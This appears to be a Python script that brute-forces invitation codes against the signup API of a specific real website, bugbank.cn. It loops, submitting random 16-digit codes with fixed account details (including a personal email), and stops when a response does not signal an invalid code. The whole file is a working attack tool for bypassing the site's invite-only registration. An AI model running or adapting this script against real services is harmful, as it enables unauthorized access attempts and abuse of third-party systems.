import requests
import random,time

headers={'Host':' www.bugbank.cn',
'User-Agent':' Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
'Accept':' application/json, text/javascript, */*; q=0.01',
'Accept-Language':' en-US,zh;q=0.8,zh-CN;q=0.5,en;q=0.3',
'Accept-Encoding':' gzip, deflate',
'Content-Type':' application/x-www-form-urlencoded; charset=UTF-8',
'x-client-id':' user-web',
'X-Requested-With':' XMLHttpRequest',
'Referer':' http://www.bugbank.cn/signup.html',
'Content-Length':' 197',
'Connection':' keep-alive'}
url='http://www.bugbank.cn/api/signup'
code='%016d' % random.randint(0,1000000000000000)
data={'name':'xiaoxiaoyao','email':'yao.power@qq.com','password':'6a57b69d557c5da3cc32cf183ec5c148','code':code}

def post(code):
	data={'name':'xiaoxiaoyao','email':'yao.power@qq.com','password':'6a57b69d557c5da3cc32cf183ec5c148','code':code}
	res1 = requests.post(url, data=data, headers=headers)
	return res1

while True:
	code='%016d' % random.randint(0,10000000000000000)
	j=post(code)
	i=j.status_code
	time.sleep(10)
	print(i)
	if (i == 406) or (i == 409) or (i == 429) or (i == 504):
		print('post(code) == 406失效邀请码/409/429/504',code)
		pass
	else:
		print('NOT post(code) == 406/409/429 AND code=',j.content,code)
		break
	
